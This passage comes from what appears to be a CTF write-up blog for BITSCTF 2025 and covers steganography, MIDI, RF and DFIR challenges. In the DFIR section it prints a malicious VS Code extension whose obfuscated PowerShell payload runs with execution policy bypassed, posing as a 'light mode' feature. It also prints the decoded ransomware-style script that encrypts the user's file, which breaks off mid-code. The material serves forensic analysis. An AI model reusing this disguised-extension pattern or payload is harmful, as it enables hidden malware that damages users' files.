class="string">WCTF&#123;GAME_OVER_VMASBKLTNUFMGS&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
            <tag> DFIR </tag>
            
            <tag> Steganography </tag>
            
            <tag> File Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BITSCTF-2025</title>
      <link href="/2025/02/09/BITSCTF-2025/"/>
      <url>/2025/02/09/BITSCTF-2025/</url>
      
        <content type="html"><![CDATA[<p>I participated in BITSCTF 2025, organized by Bitskrieg. Here are the Writeups of some Forensics, RF and DFIR challenges I was personally able to solve during the competition.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Finders-Keepers"><a href="#Finders-Keepers" class="headerlink" title="Finders Keepers"></a>Finders Keepers</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Another simple steganography challenge where we are initially given a .png file.</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>The given png has a .jpeg and a .wav file embedded in itself which we can find by the hex analysis and then extract the file using byte scraping to get the following two files.</p><p><a href="/./files/extracted_at_0x12005.jpg">Image</a><br><a href="/./files/extracted_at_0x645f0.wav">Audio</a></p><p>The audio file on opening in audacity immediately shows the profile of a morse code so we use this online tool (<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a>) to decode the morse code and get its message as <code>snooooooppppppp</code>, which happens to be the steghide passphrase for the extracted jpeg file and it gives us our flag.</p><p><img src="/./images/audacity.png" alt="Audacity"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;1_4m_5l33py_1256AE76&#125;</span></span><br></pre></td></tr></table></figure><h3 id="AutoBots-Unite"><a href="#AutoBots-Unite" class="headerlink" title="AutoBots Unite!"></a>AutoBots Unite!</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a chall.dwg file with following description: “Mr. Douglas Adams is so sick and tired of old people using the same encryption methods again and again.”</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>Inital searches reveal that a .dwg file is a 2D or 3D drawing created with Autodesk AutoCAD so we can open the file in AutoDesk Online here (<a href="https://viewer.autodesk.com/designviews">https://viewer.autodesk.com/designviews</a>). On opening the file here we get a really absurd looking image of some sort of barcode.</p><p><img src="/./images/chall.dwg.png" alt="Chall.dwg"></p><p>Initially I tried various different approaches of finding some differences in the lines color shades or the inter-line distances but at the end it turned out that the flag was embedded in the lengths of the lines. All lines had lengths of type 42.xxx or 43.xxx so if we do <code>round((length-42)*100)</code> we get ASCII codes which on decoding initially gives some garbish but eventually reveals our flag.</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;b4rc0d3s_4r3_0v3r4t3d_4sf_h3h3_0k1md0n3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Symphonies"><a href="#Symphonies" class="headerlink" title="Symphonies"></a>Symphonies</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are presented with a midi file (though corrupted) and our target is to decode its message.</p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>Inital searches reveal that a .midi file varies from MP3 or WAV files as it is not a waveform. This means that it inherently produces no audio signal. MIDI files contain messages that communicate to software instruments (or connected hardware gear) what to play. These messages include:</p><pre><code>Note-on/off: Note on signifies the start of a specific keyboard note; note-off signifies the end of a note.Velocity value: High values lead to a louder volume for that note as well as possible articulation differences; low values lead to lower volumes for the note.Pitch bend: Controls pitch alterations up or down a semitone (often linked to pitch bend wheels).</code></pre><p><img src="/./images/midi_hex.png" alt="Original Hex"></p><p>Initially the magic bytes of the given file are corrupted which we can quickly fix to the correct bytes <code>4D 54 68 64</code> to fix the .midi file which we can now load in (<a href="https://signal.vercel.app/edit">https://signal.vercel.app/edit</a>) for its visualisation.</p><p><img src="/./images/midi.png" alt="Midi file"></p><p>Immediately what catches our eye is all the velocities lie below 127 so these may represent an ASCII code so we write the following code to get and decode both the file’s velocites and the notes which then because are 2 strings of similar lengths we try to XOR them as our first option and that just happends to be the correct solution to get our flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mido</span><br><span class="line"></span><br><span class="line">midi = mido.MidiFile(<span class="string">&#x27;Demo2.midi&#x27;</span>)</span><br><span class="line">velocities = <span class="string">&#x27;&#x27;</span></span><br><span class="line">notes=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> midi:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> msg.is_meta <span class="keyword">and</span> msg.<span class="built_in">type</span> == <span class="string">&#x27;note_on&#x27;</span>:</span><br><span class="line">        velocities = velocities + <span class="built_in">chr</span>(msg.velocity)</span><br><span class="line">        notes = notes + <span class="built_in">chr</span>(msg.note)</span><br><span class="line"></span><br><span class="line">notes = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,notes.split()))</span><br><span class="line">notes = notes[:<span class="built_in">len</span>(velocities)]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a ^ <span class="built_in">ord</span>(b)) <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(notes, velocities))</span><br><span class="line"><span class="built_in">print</span>(result.encode())</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;y0u_7h0u6h7_y0u_c0uld_6u355_7h15?!_qrtd434&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Hardware-RF"><a href="#Hardware-RF" class="headerlink" title="Hardware&#x2F;RF"></a>Hardware&#x2F;RF</h2><h3 id="ulation"><a href="#ulation" class="headerlink" title="%ulation"></a>%ulation</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a complex signal file in this challenge and the name obviously hint to some sort of modulation of the signal is involved.</p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>Fairly straight forward challenge where all we had to do was open the file in Universal Radio Hacker (<a href="https://github.com/jopohl/urh">https://github.com/jopohl/urh</a>) and it does all the job for us and immediately spit out the flag.</p><p><img src="/./images/modulation_urh.png" alt="Given Signal"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;A_br13f_4nd_g3ntl3_1ntr0duc710n_70_r4di0_h4ck1ng_c5c33558&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Old-Skool"><a href="#Old-Skool" class="headerlink" title="Old Skool"></a>Old Skool</h3><h4 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a .iq file with the following description:<br>“I remember my father talking about those old age radios and how they work. Pretty cool if you ask me. Also he told me about a radio channel which had a frequency between 1500-1599khz from PHILIPPINES.</p><p>Note: Sampling Rate for the file is 24kHz”</p><h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>We are given a .iq file, which are standard RF signal files wherein the Sampling rate of given file being 24 khz and the freq range of the radio channel used to transmit being of range 1500-1599 kHz immediately tells its a challenge of Frequency Modulation or downsampling. Now being an ECE student I decided to do signal analysis using MATLAB just to be old school and justify the challenge name.</p><p>The process I followed was to first read the iq and interpret it as complex signals that they are <code>I+jQ</code> where I is the In-phase component and Q is the Quadrature-phase component. Then perform signal mixing to make it baseband and remove the DC components. Finally add a band-pass (butterworth) filter on top.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">clc; clear; close all;</span><br><span class="line">filename = <span class="string">&#x27;\modulated.iq&#x27;</span>;</span><br><span class="line">fs = <span class="number">24000</span>;</span><br><span class="line"></span><br><span class="line">fid = fopen(filename, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">raw_data = fread(fid, <span class="string">&#x27;float32&#x27;</span>); </span><br><span class="line"></span><br><span class="line">iq_data = <span class="built_in">complex</span>(raw_data(<span class="number">1</span>:<span class="number">2</span>:<span class="keyword">end</span>), raw_data(<span class="number">2</span>:<span class="number">2</span>:<span class="keyword">end</span>));</span><br><span class="line">t = (<span class="number">0</span>:<span class="built_in">length</span>(iq_data)<span class="number">-1</span>) / fs;</span><br><span class="line">f_station = <span class="number">1566000</span>;</span><br><span class="line">shifted_signal = iq_data .* <span class="built_in">exp</span>(<span class="number">-1</span><span class="built_in">j</span> * <span class="number">2</span> * <span class="built_in">pi</span> * f_station * t.&#x27;);</span><br><span class="line"></span><br><span class="line">am_signal = <span class="built_in">abs</span>(shifted_signal);</span><br><span class="line">am_signal = am_signal - <span class="built_in">mean</span>(am_signal);</span><br><span class="line">am_signal = am_signal / <span class="built_in">max</span>(<span class="built_in">abs</span>(am_signal));</span><br><span class="line"></span><br><span class="line">fc = <span class="number">5000</span>;</span><br><span class="line">[b, a] = butter(<span class="number">5</span>, fc/(fs/<span class="number">2</span>));</span><br><span class="line">filtered_audio = filter(b, a, am_signal);</span><br><span class="line"></span><br><span class="line">audiowrite(<span class="string">&#x27;radio_audio.wav&#x27;</span>, filtered_audio, fs);</span><br><span class="line">sound(filtered_audio, fs);</span><br></pre></td></tr></table></figure><p><a href="/./files/radio_audio.wav">Extracted Audio</a></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;welcome_to_our_radio_enjoy_our_song_collection&#125;</span></span><br></pre></td></tr></table></figure><h2 id="DFIR"><a href="#DFIR" class="headerlink" title="DFIR"></a>DFIR</h2><h3 id="ViruS-Camp-1"><a href="#ViruS-Camp-1" class="headerlink" title="ViruS Camp 1"></a>ViruS Camp 1</h3><h4 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given an artifact file dimp.ad1 and the description says to decode the encrypted flag file.</p><h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>On initial analysis of the given artifacts file in FTK Imager we find a peculiar file <code>extension.js</code> which appears to be the malware in question responsible for flag encryption. So the challenge was basically around a malicious extension of VS-Code which encrypted the user’s flag image which was to be decoded. Given below is the <code>extension.js</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> __createBinding = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__createBinding</span>) || (<span class="title class_">Object</span>.<span class="property">create</span> ? (<span class="keyword">function</span>(<span class="params">o, m, k, k2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (k2 === <span class="literal">undefined</span>) k2 = k;</span><br><span class="line">    <span class="keyword">var</span> desc = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(m, k);</span><br><span class="line">    <span class="keyword">if</span> (!desc || (<span class="string">&quot;get&quot;</span> <span class="keyword">in</span> desc ? !m.<span class="property">__esModule</span> : desc.<span class="property">writable</span> || desc.<span class="property">configurable</span>)) &#123;</span><br><span class="line">      desc = &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> m[k]; &#125; &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(o, k2, desc);</span><br><span class="line">&#125;) : (<span class="keyword">function</span>(<span class="params">o, m, k, k2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (k2 === <span class="literal">undefined</span>) k2 = k;</span><br><span class="line">    o[k2] = m[k];</span><br><span class="line">&#125;));</span><br><span class="line"><span class="keyword">var</span> __setModuleDefault = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__setModuleDefault</span>) || (<span class="title class_">Object</span>.<span class="property">create</span> ? (<span class="keyword">function</span>(<span class="params">o, v</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(o, <span class="string">&quot;default&quot;</span>, &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">value</span>: v &#125;);</span><br><span class="line">&#125;) : <span class="keyword">function</span>(<span class="params">o, v</span>) &#123;</span><br><span class="line">    o[<span class="string">&quot;default&quot;</span>] = v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> __importStar = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__importStar</span>) || (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ownKeys = <span class="keyword">function</span>(<span class="params">o</span>) &#123;</span><br><span class="line">        ownKeys = <span class="title class_">Object</span>.<span class="property">getOwnPropertyNames</span> || <span class="keyword">function</span> (<span class="params">o</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> ar = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o) <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(o, k)) ar[ar.<span class="property">length</span>] = k;</span><br><span class="line">            <span class="keyword">return</span> ar;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">ownKeys</span>(o);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">mod</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mod &amp;&amp; mod.<span class="property">__esModule</span>) <span class="keyword">return</span> mod;</span><br><span class="line">        <span class="keyword">var</span> result = &#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (mod != <span class="literal">null</span>) <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="title function_">ownKeys</span>(mod), i = <span class="number">0</span>; i &lt; k.<span class="property">length</span>; i++) <span class="keyword">if</span> (k[i] !== <span class="string">&quot;default&quot;</span>) <span class="title function_">__createBinding</span>(result, mod, k[i]);</span><br><span class="line">        <span class="title function_">__setModuleDefault</span>(result, mod);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="built_in">exports</span>, <span class="string">&quot;__esModule&quot;</span>, &#123; <span class="attr">value</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">activate</span> = activate;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">deactivate</span> = deactivate;</span><br><span class="line"><span class="keyword">const</span> vscode = <span class="title function_">__importStar</span>(<span class="built_in">require</span>(<span class="string">&quot;vscode&quot;</span>));</span><br><span class="line"><span class="keyword">const</span> child_process_1 = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="title function_">__importStar</span>(<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>));</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">activate</span>(<span class="params">context</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> command = vscode.<span class="property">commands</span>.<span class="title function_">registerCommand</span>(<span class="string">&quot;rs&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> scriptContent = <span class="string">`$wy7qIGPnm36HpvjrL2TMUaRbz = &quot;K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ&quot; ;</span></span><br><span class="line"><span class="string">$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2&gt;&amp;1&gt; $null ;</span></span><br><span class="line"><span class="string">$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng(&quot;$9U5RgiwHSYtbsoLuD3Vf6&quot;)) ;</span></span><br><span class="line"><span class="string">$9ozWfHXdm8eIBYru = &quot;InV&quot;+&quot;okE&quot;+&quot;-ex&quot;+&quot;prE&quot;+&quot;SsI&quot;+&quot;ON&quot; ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`</span>;</span><br><span class="line">        <span class="keyword">const</span> scriptPath = <span class="string">`C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001`</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fs.<span class="title function_">writeFileSync</span>(scriptPath, scriptContent);</span><br><span class="line">            vscode.<span class="property">window</span>.<span class="title function_">showInformationMessage</span>(<span class="string">`The light mode will activate in a few minutes.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            vscode.<span class="property">window</span>.<span class="title function_">showErrorMessage</span>(<span class="string">`Error activating light mode.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        (<span class="number">0</span>, child_process_1.<span class="property">exec</span>)(<span class="string">`powershell.exe -ExecutionPolicy Bypass -File &quot;<span class="subst">$&#123;scriptPath&#125;</span>&quot;`</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    context.<span class="property">subscriptions</span>.<span class="title function_">push</span>(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deactivate</span>(<span class="params"></span>) &#123; &#125;</span><br><span class="line"><span class="comment">//# sourceMappingURL=extension.js.map</span></span><br></pre></td></tr></table></figure><p>The first flag was fairly staright forward it was just b64 encoded and commented in the end of the above code so we got out first flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">The 1st flag is: BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ViruS-Camp-2"><a href="#ViruS-Camp-2" class="headerlink" title="ViruS Camp 2"></a>ViruS Camp 2</h3><h4 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Follow up to the first challenge wherein now we need to decode the encryption methodology and decode the flag.enc we get from the same .ad1 file.</p><h4 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h4><p>On simple deobfuscation of the extension we get that it executed the following powershell script for the encryption.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MyS3cr3tP4ssw0rd&quot;</span></span><br><span class="line"><span class="variable">$salt</span> = [<span class="built_in">Byte</span>[]](<span class="number">0</span>x01,<span class="number">0</span>x02,<span class="number">0</span>x03,<span class="number">0</span>x04,<span class="number">0</span>x05,<span class="number">0</span>x06,<span class="number">0</span>x07,<span class="number">0</span>x08)</span><br><span class="line"><span class="variable">$iterations</span> = <span class="number">10000</span></span><br><span class="line"><span class="variable">$keySize</span> = <span class="number">32</span>   </span><br><span class="line"><span class="variable">$ivSize</span> = <span class="number">16</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$deriveBytes</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.Rfc2898DeriveBytes(<span class="variable">$password</span>, <span class="variable">$salt</span>, <span class="variable">$iterations</span>)</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$deriveBytes</span>.GetBytes(<span class="variable">$keySize</span>)</span><br><span class="line"><span class="variable">$iv</span> = <span class="variable">$deriveBytes</span>.GetBytes(<span class="variable">$ivSize</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$inputFile</span> = <span class="string">&quot;C:\\Users\\vboxuser\\Desktop\\flag.png&quot;</span></span><br><span class="line"><span class="variable">$outputFile</span> = <span class="string">&quot;C:\\Users\\vboxuser\\Desktop\\flag.enc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$aes</span> = [<span class="type">System.Security.Cryptography.Aes</span>]::Create()</span><br><span class="line"><span class="variable">$aes</span>.Key = <span class="variable">$key</span></span><br><span class="line"><span class="variable">$aes</span>.IV = <span class="variable">$iv</span></span><br><span class="line"><span class="variable">$aes</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line"><span class="variable">$aes</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::PKCS7</span><br><span class="line"></span><br><span class="line"><span class="variable">$encryptor</span> = <span class="variable">$aes</span>.CreateEncryptor()</span><br><span class="line"></span><br><span class="line"><span class="variable">$plainBytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="variable">$inputFile</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$outStream</span> = <span class="built_in">New-Object</span> System.IO.FileStream(<span class="variable">$outputFile</span>, [<span 